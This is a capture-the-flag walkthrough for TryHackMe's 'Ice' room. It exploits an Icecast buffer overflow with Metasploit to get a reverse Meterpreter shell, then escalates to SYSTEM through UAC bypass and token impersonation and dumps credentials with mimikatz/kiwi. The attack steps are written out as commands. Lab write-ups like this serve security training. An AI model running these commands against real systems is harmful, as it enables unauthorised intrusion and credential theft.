# 🧊 Ice — TryHackMe Walkthrough

**Room:** [Ice](https://tryhackme.com/room/ice)
**Difficulty:** Easy
**Category:** Windows / Metasploit / Privilege Escalation
**Tags:** Windows, Icecast, CVE-2004-1561, Metasploit, mimikatz

---

## 📋 Overview

Ice is a Windows machine running the **Icecast media streaming server**, which is vulnerable to a buffer overflow (CVE-2004-1561). You'll exploit this, then escalate privileges using Metasploit post-exploitation modules.

---

## 🔧 Tools Used

- `nmap` — Port scanning
- Metasploit Framework — Exploitation and post-exploitation
- `mimikatz` — Credential dumping

---

## 📡 Step 1: Nmap Scan

```bash
nmap -sV -sC <TARGET_IP>
```

**Key ports:**
- Port 8000 — Icecast media server
- Port 3389 — RDP
- Port 135/139/445 — Windows services

---

## 🔍 Step 2: Research the Vulnerability

Icecast version running on port 8000 is vulnerable to **CVE-2004-1561** — a buffer overflow in the HTTP header handling. Search for the exploit:

```bash
msfconsole
search icecast
use exploit/windows/http/icecast_header
```

---

## 💥 Step 3: Exploitation

Configure and run the exploit:

```bash
set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
set LPORT 4444
run
```

You should receive a Meterpreter session as the Icecast service user.

---

## 🔍 Step 4: Enumerate the System

```bash
sysinfo           # System information
getuid            # Current user
run post/multi/recon/local_exploit_suggester   # Find privesc paths
```

---

## 🔼 Step 5: Privilege Escalation

The exploit suggester will recommend a local exploit. A common one for this machine:

```bash
use exploit/windows/local/bypassuac
set SESSION 1
run
```

Or use token impersonation:

```bash
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

---

## 🔑 Step 6: Dump Credentials with Mimikatz

With SYSTEM access:

```bash
load kiwi
creds_all
```

Or run mimikatz directly:

```bash
execute -f mimikatz.exe -H -i
sekurlsa::logonpasswords
```

---

## 🚩 Capture the Flags

```bash
# Navigate to user desktop
cd C:\\Users\\Dark\\Desktop
cat user.txt

# Root/admin flag
cat C:\\Users\\Administrator\\Desktop\\root.txt
```

---

## 📝 Key Takeaways

- Always keep media servers and third-party software patched — services like Icecast running on Windows are often overlooked.
- The local exploit suggester module is invaluable for Windows privilege escalation.
- Mimikatz/Kiwi can dump plaintext passwords from LSASS memory on older Windows systems.
- **Windows Defender and credential guard** on modern systems block Mimikatz — it's most effective on unpatched older systems.

---

## 🔗 References

- [CVE-2004-1561](https://nvd.nist.gov/vuln/detail/CVE-2004-1561)
- [TryHackMe — Ice Room](https://tryhackme.com/room/ice)
- [Walkthrough Reference](https://medium.com/@dotHatab/ice-walkthrough-ec7af2368d80)
